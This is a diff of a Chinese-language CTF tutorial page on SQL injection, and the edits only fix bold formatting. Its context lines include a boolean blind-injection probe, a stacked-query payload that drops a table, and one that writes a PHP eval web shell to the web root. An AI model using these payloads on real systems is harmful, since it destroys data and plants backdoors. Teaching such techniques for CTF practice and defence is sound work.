@@ -478,8 +478,8 @@ Disallow: /hidden/flag.txt
 </ul>
 
 <h5 id="boolean-盲注" data-numberify>Boolean 盲注<a class="anchor ms-1" href="#boolean-盲注"></a></h5>
-<p>**适用场景：<strong>页面不显示数据，<strong>但会根据SQL真假返回“成功/失败”或“存在/不存在”的不同页面。</strong>
-<strong>核心逻辑：</strong><code>and ascii(substr(database(),1,1)) &gt; 100</code> —— 页面正常则继续，异常则调整ASCII码。</strong></p>
+<p><strong>适用场景</strong>：页面不显示数据，<strong>但会根据SQL真假返回“成功/失败”或“存在/不存在”的不同页面。</strong>
+<strong>核心逻辑：</strong><code>and ascii(substr(database(),1,1)) &gt; 100</code> —— 页面正常则继续，异常则调整ASCII码。**</p>
 <ul>
 <li><strong>CTF小技巧</strong>：写脚本时注意<strong>二分法</strong>（50, 75, 88&hellip;）可以大幅减少请求次数；如果页面差异不明显，注意比较<code>响应包长度(Content-Length)</code>或<code>状态码</code>，不要肉眼看。</li>
 </ul>
@@ -504,7 +504,7 @@ Disallow: /hidden/flag.txt
 
 <h5 id="堆叠注入-stacked-queries" data-numberify>堆叠注入 (Stacked Queries)<a class="anchor ms-1" href="#堆叠注入-stacked-queries"></a></h5>
 <p><strong>适用场景</strong>：<code>mysqli_multi_query()</code> 或 PDO 允许多语句执行（CTF中常见于强网杯、HCTF）。
-<strong>CTF核心玩法</strong>：它不用于“查数据”，而是用于**“改数据”<strong>或</strong>“写文件”**。</p>
+<strong>CTF核心玩法</strong>：它不用于查数据，而是用于<strong>改数据</strong>或<strong>写文件</strong>。</p>
 <ul>
 <li>
 <p><code>; drop table flag -- -</code> （破坏性，慎用）</p>
@@ -516,7 +516,7 @@ Disallow: /hidden/flag.txt
 <p><code>; select '&lt;?php eval($_POST[1])?&gt;' into outfile '/var/www/shell.php'</code> （需知路径）</p>
 </li>
 <li>
-<p><strong>关键提示</strong>：必须提醒读者——<strong>堆叠注入在CTF中90%用于getshell或UDF提权</strong>，而不是查表内容。</p>
+<p><strong>关键提示</strong>：<strong>堆叠注入在CTF中90%用于getshell或UDF提权</strong>，而不是查表内容。</p>
 </li>
 </ul>
 <hr>
